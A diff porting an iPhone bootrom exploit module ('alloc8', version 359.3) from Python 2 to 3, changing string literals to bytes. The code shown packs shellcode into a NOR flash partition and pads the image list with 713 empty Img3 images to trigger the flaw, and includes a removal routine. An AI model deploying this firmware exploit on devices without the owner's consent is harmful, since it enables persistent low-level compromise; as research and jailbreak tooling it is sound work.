@@ -1,5 +1,3 @@
-from __future__ import print_function
-
 import copy, struct, sys
 
 alloc8_constants_359_3 = [
@@ -60,7 +58,7 @@ alloc8_constants_359_3_2 = [
 
 def empty_img3(size):
 	assert size >= 20
-	return struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\x00' * (size - 20)
+	return struct.pack('<4s3I4s', b'Img3'[::-1], size, 0, 0, b'zero'[::-1]) + b'\x00' * (size - 20)
 
 def exploit(nor, version):
 	if version == '359.3':
@@ -74,7 +72,7 @@ def exploit(nor, version):
 	    sys.exit(1)
 
 	for c in nor.parts[1]:
-		assert c == '\x00'
+		assert c == 0
 	assert len(nor.images) < 32
 
 	MAX_SHELLCODE_LENGTH = 460
@@ -90,7 +88,7 @@ def exploit(nor, version):
 	    assert value == 0xBAD00001 + i
 
 	new_nor = copy.deepcopy(nor)
-	new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + '\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))
+	new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants) + b'\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))
 
 	while len(new_nor.images) < 713:
 	   new_nor.images.append(empty_img3(new_nor.block_size))
@@ -117,11 +115,11 @@ def remove_exploit(nor):
     new_images = []
     for image in new_nor.images:
         assert len(image) >= 20
-        if image[16:20] != 'zero'[::-1]:
+        if image[16:20] != b'zero'[::-1]:
             new_images.append(image)
     assert len(new_images) < 32
 
     new_nor.images = new_images
-    new_nor.parts[1] = '\x00' * 460
+    new_nor.parts[1] = b'\x00' * 460
 
     return new_nor
